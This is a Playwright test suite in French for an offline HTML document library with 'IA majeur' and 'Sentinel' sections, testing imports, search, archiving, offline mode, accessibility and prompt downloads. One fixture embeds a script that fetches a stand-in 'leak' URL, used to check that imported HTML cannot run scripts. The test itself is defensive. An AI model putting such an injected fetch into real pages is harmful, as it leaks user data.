import { test, expect, type Page } from "@playwright/test";
import AxeBuilder from "@axe-core/playwright";
import { v643HTML } from "../helpers/v643";
import { readFile } from "node:fs/promises";
async function nav(page: Page, label: string) {
  await page
    .locator(
      (await page.locator(".sidebar").isVisible()) ? ".sidebar" : ".mobile-nav",
    )
    .getByRole("button", { name: label, exact: true })
    .click();
}
async function importFile(
  page: Page,
  title = "Dossier commun",
  destination?: string,
) {
  await page.getByLabel("Fichiers HTML à importer").setInputFiles({
    name: "dossier.html",
    mimeType: "text/html",
    buffer: Buffer.from(v643HTML({ title })),
  });
  if (destination)
    await page
      .getByRole("dialog")
      .getByLabel("Ranger ce HTML dans")
      .selectOption(destination);
  await page
    .getByRole("button", {
      name: "Enregistrer dans ma bibliothèque",
      exact: true,
    })
    .click();
  await expect(page.getByRole("dialog")).toHaveCount(0);
  const notification = page.getByRole("button", {
    name: "Fermer la notification",
    exact: true,
  });
  if (await notification.isVisible()) await notification.click();
}
test("IA majeur et Sentinel : imports dirigés, documents de même date, doublons séparés et retour du lecteur", async ({
  page,
}) => {
  await page.goto("/");
  await importFile(page);
  await nav(page, "IA majeur");
  const ai = page.getByRole("region", {
    name: "Documents IA majeur",
    exact: true,
  });
  await expect(
    ai.getByRole("heading", { name: "Vos HTML IA majeur, ici.", exact: true }),
  ).toBeVisible();
  await importFile(page);
  await expect(ai.locator(".collection-card")).toHaveCount(1);
  await importFile(page, "Second dossier IA");
  await expect(ai.locator(".collection-card")).toHaveCount(2);
  await nav(page, "Sentinel");
  const sentinel = page.getByRole("region", {
    name: "Documents Sentinel",
    exact: true,
  });
  await importFile(page);
  await expect(sentinel.locator(".collection-card")).toHaveCount(1);
  await sentinel
    .getByRole("button", { name: "Ouvrir le HTML", exact: true })
    .click();
  await expect(page.locator(".edition-frame")).toBeVisible();
  await page
    .locator(".reading-surface")
    .getByRole("button", { name: "Retour à Sentinel", exact: true })
    .click();
  await expect(sentinel).toBeVisible();
  await page.reload();
  await nav(page, "Sentinel");
  await expect(sentinel.locator(".collection-card")).toHaveCount(1);
  await nav(page, "IA majeur");
  await expect(ai.locator(".collection-card")).toHaveCount(2);
  await nav(page, "Bibliothèque");
  await expect(page.locator(".day-card")).toHaveCount(1);
});
test("destination modifiable à l’import, recherche, archives, corbeille et mode hors ligne", async ({
  page,
  context,
}) => {
  await page.goto("/");
  await importFile(page, "Rapport Sentinel", "sentinel");
  const section = page.getByRole("region", {
    name: "Documents Sentinel",
    exact: true,
  });
  await expect(section).toBeVisible();
  await section.getByLabel("Rechercher dans Sentinel").fill("absent");
  await expect(section.locator(".collection-card")).toHaveCount(0);
  await section.getByLabel("Rechercher dans Sentinel").fill("RAPPORT");
  await expect(section.locator(".collection-card")).toHaveCount(1);
  await section.getByRole("button", { name: "Archiver", exact: true }).click();
  await expect(section.locator(".collection-card")).toHaveCount(0);
  await section.getByRole("button", { name: "Archives", exact: true }).click();
  await section
    .getByRole("button", { name: "Désarchiver", exact: true })
    .click();
  await section.getByRole("button", { name: "Documents", exact: true }).click();
  await section
    .locator(".collection-card")
    .getByRole("button", { name: "Corbeille", exact: true })
    .click();
  await section
    .locator(".mode-tabs")
    .getByRole("button", { name: "Corbeille", exact: true })
    .click();
  await section.getByRole("button", { name: "Restaurer", exact: true }).click();
  await section.getByRole("button", { name: "Documents", exact: true }).click();
  await expect(section.locator(".collection-card")).toHaveCount(1);
  await page.evaluate(async () => {
    await navigator.serviceWorker.ready;
  });
  await expect
    .poll(() => page.evaluate(() => !!navigator.serviceWorker.controller))
    .toBe(true);
  await context.setOffline(true);
  await page.reload();
  await nav(page, "Sentinel");
  await expect(section.locator(".collection-card")).toHaveCount(1);
  await section
    .getByRole("button", { name: "Ouvrir le HTML", exact: true })
    .click();
  await expect(
    page.frameLocator(".edition-frame").getByRole("heading", {
      name: "Compatibilité V6.4.3 synthétique",
      exact: true,
    }),
  ).toBeVisible();
});
test("navigation mobile visible et accessibilité des deux nouveaux espaces", async ({
  page,
}) => {
  await page.goto("/");
  for (const width of [320, 390, 1440]) {
    await page.setViewportSize({ width, height: 900 });
    await nav(page, "IA majeur");
    await expect(
      page.getByRole("button", {
        name: "Importer dans IA majeur",
        exact: true,
      }),
    ).toBeVisible();
    await nav(page, "Sentinel");
    await expect(
      page.getByRole("button", { name: "Importer dans Sentinel", exact: true }),
    ).toBeVisible();
    expect(
      await page.evaluate(
        () => document.documentElement.scrollWidth <= innerWidth,
      ),
    ).toBe(true);
    if (width < 700)
      await expect(page.locator(".mobile-nav button:visible")).toHaveCount(9);
  }
  expect((await new AxeBuilder({ page }).analyze()).violations).toEqual([]);
  await page.screenshot({
    path: test.info().outputPath("sentinel-desktop.png"),
    fullPage: true,
  });
  await page.setViewportSize({ width: 390, height: 844 });
  await page.screenshot({
    path: test.info().outputPath("sentinel-mobile.png"),
    fullPage: true,
  });
});

test("Sentinel : télécharge le prompt Markdown exact depuis une carte existante, même hors ligne", async ({
  page,
  context,
}) => {
  const prompt =
    "# Mission VS Code — Évaluation\n\n```ts\nconst a = '<tag> & test';\n```\n\nFin.\n";
  const html = `<title>Sentinel avec prompt</title><h1>Rapport</h1><script>window.promptScriptRan = true; fetch('https://example.invalid/leak')</script><section><h2>PROMPT COMPLET POUR VS CODE / CODEX</h2><textarea id="fullPrompt">${prompt.replaceAll("&", "&amp;").replaceAll("<", "&lt;")}</textarea></section>`;
  await page.goto("/");
  await nav(page, "Sentinel");
  await page.getByLabel("Fichiers HTML à importer").setInputFiles({
    name: "SENTINEL_TEST.html",
    mimeType: "text/html",
    buffer: Buffer.from(html),
  });
  await page
    .getByRole("button", {
      name: "Enregistrer dans ma bibliothèque",
      exact: true,
    })
    .click();
  await expect(page.getByRole("dialog")).toHaveCount(0);
  await page.reload();
  await nav(page, "Sentinel");
  const card = page.locator(".collection-card").filter({
    has: page.getByRole("heading", {
      name: "Sentinel avec prompt",
      exact: true,
    }),
  });
  await context.setOffline(true);
  await card
    .getByRole("button", { name: "Voir les prompts VS Code", exact: true })
    .click();
  const downloaded = page.waitForEvent("download");
  await card
    .getByRole("button", {
      name: "Télécharger le prompt VS Code (.md)",
      exact: true,
    })
    .click();
  const file = await downloaded;
  expect(file.suggestedFilename()).toBe("SENTINEL_TEST_PROMPT_VSCODE.md");
  expect(await readFile((await file.path())!, "utf8")).toBe(prompt);
  await expect(card.getByRole("status")).toContainText(
    "Téléchargement du prompt lancé.",
  );
  expect(await page.evaluate(() => "promptScriptRan" in window)).toBe(false);
  expect(
    (
      await new AxeBuilder({ page })
        .include(".collection-view:not([hidden])")
        .analyze()
    ).violations,
  ).toEqual([]);
  for (const width of [320, 390, 1440]) {
    await page.setViewportSize({ width, height: 900 });
    expect(
      await page.evaluate(
        () => document.documentElement.scrollWidth <= innerWidth,
      ),
    ).toBe(true);
  }
  await context.setOffline(false);
  await importFile(page, "Sans prompt");
  const missing = page.locator(".collection-card").filter({
    has: page.getByRole("heading", { name: "Sans prompt", exact: true }),
  });
  await missing
    .getByRole("button", { name: "Voir les prompts VS Code", exact: true })
    .click();
  await expect(missing.getByRole("status")).toContainText(
    "Aucun prompt VS Code identifiable",
  );
  await expect(
    missing.getByRole("button", {
      name: "Télécharger le prompt VS Code (.md)",
      exact: true,
    }),
  ).toHaveCount(0);
});
